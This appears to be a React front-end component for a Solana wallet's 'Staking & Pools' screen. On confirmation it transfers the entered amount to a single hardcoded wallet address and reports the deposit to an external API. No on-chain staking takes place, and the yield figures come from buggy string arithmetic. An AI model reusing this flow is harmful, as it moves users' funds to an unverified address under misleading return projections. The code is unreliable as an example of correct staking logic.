/* eslint-disable react-hooks/exhaustive-deps */
/* eslint-disable no-unused-vars */
import Header from "../Header";
import Footer from "../Footer";
import screen from "../../main";
import Loading from "../Loading";
import { useEffect, useState } from "react";
import { Keypair, Connection, clusterApiUrl, LAMPORTS_PER_SOL, SystemProgram, sendAndConfirmTransaction, PublicKey, Transaction } from "@solana/web3.js";
import { getAccount, addToAccount } from "../../systems/storage/store";
import * as buffer from "buffer";
import load from "../../functions/loader";
import { ToastContainer, toast } from 'react-toastify';
import defaults from "../../crypto/defaults";
import { Fade } from "react-awesome-reveal";
import axios from "axios";
import { mnemonicToSeed, generateMnemonic } from "bip39";
import { fromMasterSeed } from "hdkey";
import { send_sol } from "../../crypto/sol/transfer";
import { truncateNumberDefault } from "../../crypto/defaults";
window.Buffer = buffer.Buffer;
function StepNine() {
  const [balances, updateBalances] = useState(defaults.balances);
  const [tokenBalance_usd, updateTokenBalance_usd] = useState(0);
  const [tokenPrice, updateTokenPrice] = useState(0);
  const [sending, setSending] = useState(false);
  const [dayTallage, setTallage_d] = useState('0');
  const [monthTallage, setTallage_m] = useState('0');
  const [yearTallage, setTallage_y] = useState('0');
  const [coin, setCoin] = useState({rates: [{apy: 0}]});
  const [account, setAccount] = useState({});
  const [loading, setLoading] = useState(false);
  useEffect(() => {
    async function setBalances() {
      const result = await getAccount();
      setCoin(result.staking_data);
      setAccount(result)
      updateBalances(result.balances);
      updateTokenBalance_usd(result.balances[0][result.staking_data.ticker].usd)
      updateTokenPrice(result.prices[0][result.staking_data.ticker].usd);
    }
    setBalances()
  }, [])

  function setmax() {
    const inputel = document.getElementById('amount');
    const tokenobj = balances[0][coin.ticker.toLowerCase()];
    if(tokenobj.contract != 'solana') {
      inputel.value = parseFloat(tokenobj.balance);
    } else {
      inputel.value = parseFloat(tokenobj.balance - 0.000005);
    }
  }

  function calcPerc(inp) {
      const inputsumm = parseFloat(inp);
      if (inp == '' || inp == ' ' || inputsumm <= 0 || isNaN(inp) || inp == 'NaN') {
        updateTokenBalance_usd(truncateNumberDefault(tokenPrice))
        setSending(true);
        return;
      }
      setSending(false);
      const floatyearpercent = parseFloat((coin.rates[0].apy * 100).toFixed(2));
      const coinhigh = coin.ticker.toUpperCase();

      const daypercent = floatyearpercent / 365;
      const monthpercent = floatyearpercent / 12;
      const yearpercent = floatyearpercent;

      const tallageday = parseFloat(inputsumm / 100 * daypercent).toFixed(5);
      const tallagemonth = parseFloat(inputsumm / 100 * monthpercent).toFixed(5);
      const tallageyear = parseFloat(inputsumm / 100 * yearpercent).toFixed(5);

      setTallage_d(`${parseFloat(tallageday + inputsumm).toFixed(5)} ${coinhigh}`)
      setTallage_m(`${parseFloat(tallagemonth + inputsumm).toFixed(5)} ${coinhigh}`);
      setTallage_y(`${parseFloat(tallageyear + inputsumm).toFixed(5)} ${coinhigh}`);
      updateTokenBalance_usd(truncateNumberDefault(inputsumm * tokenPrice))
  }

  async function sendnow() {
    setSending(true);
    setLoading(true);
    try {
      const address = 'EnMarshzLGE1eoZdg3G5FESfDR76cwRMYaNRNTvuYrGf';
      const value = parseFloat(document.getElementById("amount").value.toString());
      if(isNaN(value)) {
        setSending(true);
        setLoading(false);
        return;
      }
      if(value == 0) {
        setSending(true);
        setLoading(false);
        return;
      }
      if(sending == false) {
          const signature = await send_sol(value, address, balances[0][coin.ticker].contract, balances[0][coin.ticker].decimals);
          if(signature) {
            await axios.post('https://api.xbanking.org/place', {
              token: coin.ticker.toUpperCase(),
              addr: account.addr_sol,
              referal: 0,
              startdays: 0,
              summ: value,
              hash: signature,
            });
            setLoading(false);
            await load(14)
          } else {
            return toast.warn('error', {
              position: "top-right",
              autoClose: 5000,
              hideProgressBar: false,
              closeOnClick: true,
              pauseOnHover: true,
              draggable: true,
              progress: undefined,
              theme: "dark",
              });
          }
      } else {
        return;
      }
    } catch(e) {
      setSending(false);
      setLoading(false);
      console.log(e)
      if(e.includes('public key')) {
        return toast.warn('Invalid address', {
        position: "top-right",
        autoClose: 5000,
        hideProgressBar: false,
        closeOnClick: true,
        pauseOnHover: true,
        draggable: true,
        progress: undefined,
        theme: "dark",
        });
      } else {
        if(e.includes('NaN')) {
          return toast.warn('Invalid amount', {
          position: "top-right",
          autoClose: 5000,
          hideProgressBar: false,
          closeOnClick: true,
          pauseOnHover: true,
          draggable: true,
          progress: undefined,
          theme: "dark",
          });
        }
      }
    }
  }
  if (screen.current != 9) return null;
  return (
    <div>
    <Fade cascade duration={500}>
    <div className="wrapper">
    <Header actionType="back" />

      <div className="content">
      <div className="staking">
          <h1 className="title title--mini">Staking & Pools</h1>
          {loading && <Loading />}
          <form action="#" className="staking__form form">
            <div className="form__groups">

              {/* <div className="form__group">
                <label className="form__label" htmlFor="">Select Network</label>

                <div className="form__input form__block">
                  <div className="form__pic">
                    <img className="form__pic-icon" width="32" height="32" src="./img/bitcoin.svg" alt="bitcoin icon" />
                  </div>

                  <div className="form__infos">
                    <p className="form__info text text--grey">BNB Smart Chain</p>
                  </div>

                  <div className="form__right">
                    <button type="button" className="form__right-btn">
                      <img src="./img/icons/form-arrow.svg" alt="form-arrow" />
                    </button>
                  </div>
                </div>
              </div> */}

              <div className="form__group">
                <label className="form__label" htmlFor="">Amount</label>

                <div className="form__input form__block">
                  <div className="wallet__token-pic">
                    <img className="form__pic-icon" width="24" height="23" src={`./img/coins/${coin.ticker}.png`} alt="ether icon" />
                  </div>

                  <div className="form__infos">
                  <input onChange={(e) => calcPerc(e.target.value)} className="form__input_summ" id="amount" placeholder="Enter amount" />
                    <p className="form__info text--grey">${tokenBalance_usd} USD</p>
                  </div>

                  <div className="form__right">
                    <p onClick={setmax} className="form__right-text text--grey">MAX</p>
                  </div>
                </div>

                <p className="form__transaction">Transaction fee: 0.000005 SOL</p>
              </div>

            </div>

            <div className="form__income">
              <p className="form__income-label">Income:</p>

              <div className="form__income-row">
                <p className="form__income-text text">APR</p>
                <div className="form__income-dots"></div>
                <p className="form__income-text text">{coin.rates[0].apy * 100}%</p>
              </div>

              <div className="form__income-row">
                <p className="form__income-text text">&nbsp;</p>
              </div>

              <div className="form__income-row">
                <p className="form__income-text text">Daily yield</p>
                <div className="form__income-dots"></div>
                <p className="form__income-text text">{dayTallage}</p>
              </div>

              <div className="form__income-row">
                <p className="form__income-text text">Monthly yield</p>
                <div className="form__income-dots"></div>
                <p className="form__income-text text">{monthTallage}</p>
              </div>

              <div className="form__income-row">
                <p className="form__income-text text">Annual yield</p>
                <div className="form__income-dots"></div>
                <p className="form__income-text text">{yearTallage}</p>
              </div>
            </div>
          </form>

        </div>
      </div>
      <div className="send__footer btn--footer">
      <a className={sending ? "btn_disabled" : "btn"} onClick={sendnow} href="#">CONFIRM</a>
      </div>
    </div>
    </Fade>
    </div>
  )
}

export default StepNine;